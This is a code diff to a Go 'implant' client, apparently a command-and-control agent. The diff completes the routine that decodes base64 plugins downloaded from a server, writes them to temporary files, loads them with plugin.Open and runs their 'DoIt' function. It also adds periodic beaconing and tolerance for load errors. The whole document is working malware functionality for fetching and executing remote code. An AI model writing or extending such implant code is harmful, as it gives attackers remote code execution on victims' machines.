@@ -1,6 +1,7 @@
 package main
 
 import (
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"io/ioutil"
@@ -10,6 +11,7 @@ import (
 	"os"
 	"plugin"
 	"strconv"
+	"time"
 )
 
 var PrintDebugMessages bool
@@ -55,7 +57,7 @@ func (implantClient *ImplantClient) DownloadPlugins() error {
 		defer res.Body.Close()
 		pluginBase64, err := ioutil.ReadAll(res.Body)
 		CheckError(err)
-		DebugPrinter("GOT: " + string(pluginBase64))
+		// DebugPrinter("GOT: " + string(pluginBase64))
 		path, err := implantClient.WritePluginToTempDir(string(pluginBase64))
 		if err != nil {
 			return nil
@@ -66,16 +68,26 @@ func (implantClient *ImplantClient) DownloadPlugins() error {
 }
 
 func (implantClient *ImplantClient) WritePluginToTempDir(base64Plugin string) (string, error) {
-	return "", nil
+	data, err := base64.StdEncoding.DecodeString(base64Plugin)
+	CheckError(err)
+	f, err := os.CreateTemp("", "tmpfile-")
+	CheckError(err)
+	defer f.Close()
+	_, err = f.Write(data)
+	CheckError(err)
+	return f.Name(), nil
 }
 
 func (implantClient *ImplantClient) ExecutePlugins() error {
 	for idx, pluginToRun := range implantClient.PluginsToRun {
+		DebugPrinter("EXECUTING " + pluginToRun.PluginFile)
 		plugin, err := plugin.Open(pluginToRun.PluginFile)
 		if err != nil {
-			return err
+			DebugPrinter("Plugin is already loaded or some other error.")
+			DebugPrinter(err.Error())
+			continue
 		}
-
+		DebugPrinter("PLUGIN LOADED... READY TO EXECUTE")
 		doItSymbol, err := plugin.Lookup("DoIt")
 		if err != nil {
 			return err
@@ -172,5 +184,6 @@ func main() {
 	for {
 		err := implant.Loop()
 		CheckError(err)
+		time.Sleep(10 * time.Second)
 	}
 }
